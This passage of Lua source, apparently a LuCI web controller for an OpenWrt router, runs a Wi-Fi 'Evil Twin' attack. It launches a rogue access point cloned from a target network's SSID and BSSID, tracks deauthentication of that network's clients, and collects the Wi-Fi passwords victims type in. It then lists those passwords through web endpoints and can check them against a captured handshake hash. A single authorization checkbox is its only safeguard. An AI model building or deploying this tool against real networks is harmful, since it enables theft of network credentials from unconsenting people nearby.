		if d2 and d2 >= 1 and d2 <= 20 then db = d2 end
	end
	return max_rt, di, db
end

local function et_read_submit_state()
	if not nixio.fs.access(ET_SUBMIT_ST) then return "none" end
	local f = io.open(ET_SUBMIT_ST, "r"); if not f then return "none" end
	local s = f:read("*l"); f:close()
	return (s or "none"):gsub("%s+$", "")
end

local function et_deauth_active()
	if not nixio.fs.access(ET_DEAUTH_PID) then return false end
	local f = io.open(ET_DEAUTH_PID, "r"); if not f then return false end
	local pid = f:read("*l"); f:close()
	if not pid or not pid:match("^%d+$") then return false end
	return nixio.fs.access("/proc/" .. pid) and true or false
end

local function et_write_txt(path, val)
	local f = io.open(path, "w"); if f then f:write(tostring(val)); f:close() end
end

-- 读取捕获的凭据列表（格式: 时间 | 密码 | 状态）
local function et_read_creds()
	local creds = {}
	if not nixio.fs.access(ET_CREDS) then return creds end
	local f = io.open(ET_CREDS, "r")
	if not f then return creds end
	for line in f:lines() do
		local p1 = line:find(" | ", 1, true)
		if p1 then
			local ts = line:sub(1, p1 - 1):gsub("%s+$", "")
			local rem = line:sub(p1 + 3)
			local p2 = rem:find(" | ", 1, true)
			local pw, status
			if p2 then
				pw = rem:sub(1, p2 - 1)
				status = rem:sub(p2 + 3):gsub("%s+$", "")
			else
				pw = rem:gsub("%s+$", "")
				status = "legacy"
			end
			table.insert(creds, {time = ts, password = pw, status = status})
		end
	end
	f:close()
	return creds
end

function action_et_start()
	http.prepare_content("application/json")
	if et_is_running() then http.write_json({error="Evil Twin 已在运行中"}); return end
	if is_running() then http.write_json({error="握手包抓包进行中，请先停止"}); return end

	if (http.formvalue("auth_ack") or "") ~= "1" then
		http.write_json({error="请勾选授权确认"}); return
	end

	local ssid    = http.formvalue("ssid") or ""
	local bssid   = http.formvalue("bssid") or ""
	local channel = http.formvalue("channel") or "6"
	local use_cap = (http.formvalue("use_capture_hash") or "") == "1"

	if ssid == "" then http.write_json({error="请提供目标 SSID"}); return end
	if not validate_mac(bssid) then http.write_json({error="BSSID 格式无效"}); return end
	if not validate_channel(channel) then http.write_json({error="信道号无效"}); return end
	channel = tostring(math.floor(tonumber(channel)))

	if #ssid > 32 then http.write_json({error="SSID 过长"}); return end

	local iface = get_wifi_iface()
	local ap_iface = iface .. "ap"

	os.execute("mkdir -p " .. ET_DIR)
	os.execute("rm -f " .. ET_CREDS .. " " .. ET_LOG)

	if use_cap and nixio.fs.access(HASH_FILE) then
		os.execute(string.format("cp %s %s 2>/dev/null", HASH_FILE, ET_HANDSHAKE))
	else
		os.execute("rm -f " .. ET_HANDSHAKE)
	end

	local max_rt, di, db = et_uci_opts()
	et_write_txt(ET_DIR .. "/max_runtime.txt", max_rt)
	et_write_txt(ET_DIR .. "/deauth_interval.txt", di)
	et_write_txt(ET_DIR .. "/deauth_burst.txt", db)

	local ssid_file = ET_DIR .. "/start_ssid.txt"
	local sf = io.open(ssid_file, "w")
	if sf then sf:write(ssid); sf:close() end

	os.execute(string.format(
		"sh /usr/bin/arx-et.sh start \"$(cat %s)\" %s %s %s %s >> %s 2>&1 &",
		ssid_file, bssid, channel, iface, ap_iface, ET_LOG))

	local msg = "Evil Twin 启动中，目标: " .. ssid
	if use_cap and nixio.fs.access(ET_HANDSHAKE) then
		msg = msg .. "（已关联 capture.22000，可校验密码）"
	elseif use_cap then
		msg = msg .. "（未找到 capture.22000，仅演示模式二次放行）"
	end
	http.write_json({ok=true, message=msg})
end

function action_et_stop()
	http.prepare_content("application/json")
	os.execute("sh /usr/bin/arx-et.sh stop >> " .. ET_LOG .. " 2>&1")
	http.write_json({ok=true, message="Evil Twin 已停止"})
end

function action_et_status()
	http.prepare_content("application/json")
	local status = et_read_status()
	local creds  = et_read_creds()
	local submit_st = et_read_submit_state()
	local deauth_on = et_deauth_active()
	local has_hs = nixio.fs.access(ET_HANDSHAKE) and true or false
	local cap_hs = nixio.fs.access(HASH_FILE) and true or false

	local log = ""
	if nixio.fs.access(ET_LOG) then
		local lf = io.open(ET_LOG, "r")
		if lf then
			local all = lf:read("*a") or ""; lf:close()
			local lines = {}
			for l in all:gmatch("[^\r\n]+") do table.insert(lines, l) end
			local tail = {}
			for i = math.max(1, #lines - 9), #lines do table.insert(tail, lines[i]) end
			log = table.concat(tail, "\n")
		end
	end

	local ap_iface = ""
	local af = io.open(ET_AP_IFACE, "r")
	if af then ap_iface = af:read("*l") or ""; af:close() end

	http.write_json({
		status               = status,
		running              = (status == "running"),
		cred_count           = #creds,
		latest               = creds[#creds] or nil,
		log                  = log,
		ap_iface             = ap_iface,
		submit_state         = submit_st,
		deauth_active        = deauth_on,
		has_handshake        = has_hs,
		capture_hash_available = cap_hs,
	})
end

function action_et_creds()
	http.prepare_content("application/json")
	local creds = et_read_creds()
	http.write_json({creds = creds})
end

function action_et_creds_rm()
	http.prepare_content("application/json")
	nixio.fs.remove(ET_CREDS)
	http.write_json({ok=true})
end
